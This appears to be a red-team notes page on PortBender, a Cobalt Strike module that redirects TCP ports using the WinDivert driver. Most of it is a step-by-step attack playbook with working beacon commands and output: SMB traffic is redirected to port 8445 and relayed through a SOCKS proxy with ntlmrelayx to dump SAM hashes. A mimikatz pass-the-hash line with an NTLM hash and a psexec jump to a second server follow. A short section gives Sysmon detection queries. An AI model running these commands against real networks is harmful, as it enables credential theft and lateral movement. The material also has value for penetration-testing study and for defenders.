
## Command
``````beacon
beacon> help PortBender
Redirect Usage: PortBender redirect FakeDstPort RedirectedPort
Backdoor Usage: PortBender backdoor FakeDstPort RedirectedPort Password
Examples:
 PortBender redirect 445 8445
 PortBender backdoor 443 3389 praetorian.antihacker

beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP
``````

## Detection
One of the main indicators of this activity is the driver load event for WinDivert.  You can find driver loads in Kibana using Sysmon Event ID 6.  Even though the WinDivert driver has a valid signature, seeing a unique driver load on only one machine is an anomalous event.

>event.module: sysmon and event.code: 6 and not file.code_signature.subject_name: "Amazon Web Services, Inc."

As hinted above, the PortBender CNA uses the [bdllspawn](https://www.cobaltstrike.com/aggressor-script/functions.html#bdllspawn) function to spawn a new process and inject the reflective DLL into.  By default, this is rundll32 and will be logged under Sysmon Event ID 1.

## [[NTLM Relaying]]
1. Upload WinDiver64.sys driver to `C:\Windows\system32\drivers`
2. Redirecting SMB to 8445
3. Create a pfwd to relay 8845 to the C2 server with [[ntlmrelayx]] running
4. Start a socks4 on 1080 so SMB can go through
5. NTLM relay the smb connection to dump local SAM hashes
6. Use via [[Pass-the-Hash]] or crack via [[Hashcat]]

Load `PortBender.cna`
``````beacon
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> pwd
[*] Current directory is C:\Windows\system32\drivers

beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445
beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445

beacon> socks 1080
[+] started SOCKS4a server on: 1080

proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server
``````

Local NTLM hashes could then be cracked or used with [[Pass-the-Hash]].
``````beacon
beacon> mimikatz sekurlsa::pth /user:Administrator /domain:edu.evil.corp /ntlm:b423cdd3ad21718de4490d9344afef72
beacon> steal_token 21244
beacon> jump psexec64 srv2 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_a3) on srv2 via Service Control Manager (\\srv2\ADMIN$\1985e43.exe)
Started service 3695e43 on srv2
[+] established link to child beacon: 10.10.17.68
``````

```meta
requirements: admin
results: 
oss: #linux
source: https://github.com/praetorian-inc/PortBender
description: TCP Port Redirection Utility for Cobalt Strike
undetected: 
```